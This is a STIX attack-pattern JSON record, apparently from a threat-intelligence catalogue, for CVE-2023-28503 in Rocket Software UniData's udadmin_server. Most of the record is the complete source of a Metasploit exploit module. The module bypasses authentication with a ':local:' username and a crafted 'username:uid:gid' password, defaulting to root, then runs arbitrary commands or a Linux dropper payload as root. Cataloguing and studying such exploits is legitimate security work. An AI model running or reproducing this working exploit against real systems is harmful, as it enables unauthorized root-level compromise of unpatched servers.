{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b90c036-382e-41b0-bc28-0f706666b5fd",
    "created": "2024-08-14T16:57:33.307887Z",
    "modified": "2024-08-14T16:57:33.307891Z",
    "name": "Rocket Software Unidata udadmin_server Authentication Bypass",
    "description": " This module exploits an authentication bypass vulnerability in the Linux version of udadmin_server, which is an RPC service that comes with the Rocket Software UniData server. This affects versions of UniData prior to 8.2.4 build 3003.  This service typically runs as root. It accepts a username of \":local:\" and a password in the form of \"<username>:<uid>:<gid>\" where username and uid must be a valid account, but gid can be anything except 0.  This exploit takes advantage of this login account to authenticate as a chosen user and run an arbitrary command (using the built-in OsCommand message).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/unidata_udadmin_auth_bypass.rb",
            "external_id": "unidata_udadmin_auth_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2023/03/29/multiple-vulnerabilities-in-rocket-software-unirpc-server-fixed"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28503"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::Unirpc\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Rocket Software Unidata udadmin_server Authentication Bypass',\n        'Description' => %q{\n          This module exploits an authentication bypass vulnerability in the\n          Linux version of udadmin_server, which is an RPC service that comes\n          with the Rocket Software UniData server. This affects versions of\n          UniData prior to 8.2.4 build 3003.\n\n          This service typically runs as root. It accepts a username of\n          \":local:\" and a password in the form of \"<username>:<uid>:<gid>\",\n          where username and uid must be a valid account, but gid can be\n          anything except 0.\n\n          This exploit takes advantage of this login account to authenticate\n          as a chosen user and run an arbitrary command (using the built-in\n          OsCommand message).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ron Bowes', # Discovery, PoC, module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2023/03/29/multiple-vulnerabilities-in-rocket-software-unirpc-server-fixed' ],\n          [ 'CVE', '2023-28503' ],\n        ],\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 31438,\n          'PrependFork' => true\n        },\n        'Privileged' => true,\n        'DisclosureDate' => '2023-03-30',\n        'Notes' => {\n          'SideEffects' => [],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('UNIRPC_USERNAME', [ true, 'Linux username to authenticate with (must match the uid)', 'root']),\n        OptInt.new('UNIRPC_UID', [ true, 'Linux uid to authenticate with (must correspond to the username)', 0]),\n        OptInt.new('UNIRPC_GID', [ true, 'gid to authenticate with (must not be 0, does not need to correspond to the username)', 1000]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('UNIRPC_ENDPOINT', [ true, 'The UniRPC service to request', 'udadmin']),\n      ]\n    )\n  end\n\n  # We can detect UniRPC by performing a version check, but the version number\n  # didn't increment in the patch (only the build number did, which AFAICT we\n  # can't access), so just do a sanity check\n  def check\n    version = unirpc_get_version\n    vprint_status(\"Detected UniRPC version #{version} is running\")\n\n    Exploit::CheckCode::Detected\n  rescue UniRPCCommunicationError => e\n    return CheckCode::Safe(\"Could not communicate with the UniRPC server: #{e}\")\n  rescue UniRPCUnexpectedResponseError => e\n    return CheckCode::Safe(\"UniRPC server returned something unexpected: #{e}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status('Sending OsCommand request')\n    sock.put(build_unirpc_message(args: [\n      # Message type\n      { type: :integer, value: UNIRPC_MESSAGE_OSCOMMAND },\n      { type: :string, value: cmd },\n    ]))\n  end\n\n  def exploit\n    # Sanity check\n    if datastore['UNIRPC_GID'] == 0\n      fail_with(Failure::BadConfig, 'UNIRPC_GID cannot be 0')\n    end\n\n    # Connect to the service\n    connect\n\n    # Connect to the RPC service (probably \"udadmin\")\n    vprint_status(\"Connecting to UniRPC endpoint #{datastore['UNIRPC_ENDPOINT']}\")\n    sock.put(build_unirpc_message(args: [\n      # Service name\n      { type: :string, value: datastore['UNIRPC_ENDPOINT'] },\n\n      # \"Secure\" flag - this must be non-zero if the server is started in\n      # \"secure\" mode (-s)\n      { type: :integer, value: 1 },\n    ]))\n\n    # This will throw an error if the login fails, otherwise we can discard the\n    # result\n    recv_unirpc_message(sock, first_result_is_status: true)\n\n    # Prepare the authentication bypass\n    username = ':local:'\n    password = \"#{datastore['UNIRPC_USERNAME']}:#{datastore['UNIRPC_UID']}:#{datastore['UNIRPC_GID']}\"\n    vprint_status(\"Authenticating to RPC service as #{username} / #{password}\")\n\n    # Send the authentication message\n    sock.put(build_unirpc_message(args: [\n      # Message type\n      { type: :integer, value: UNIRPC_MESSAGE_LOGIN },\n\n      # Username\n      # \":local:\" is a special value that skips login\n      { type: :string, value: username },\n\n      # Password (encoded by making each byte negative)\n      # I think if username is :local:, this is username:uid:gid (gid can't be 0)\n      { type: :string, value: password.bytes.map { |b| (0x0FF & (~b)).chr }.join },\n    ]))\n\n    # Once again, we only care if this fails - if the status is an error\n    recv_unirpc_message(sock, first_result_is_status: true)\n\n    # Run the command(s)\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  rescue UniRPCCommunicationError => e\n    fail_with(Failure::Unreachable, \"Could not communicate with the UniRPC server: #{e}\")\n  rescue UniRPCUnexpectedResponseError => e\n    fail_with(Failure::UnexpectedReply, \"UniRPC server returned something unexpected: #{e}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-03-30",
    "x_mitre_platforms": [
        "linux'"
    ]
}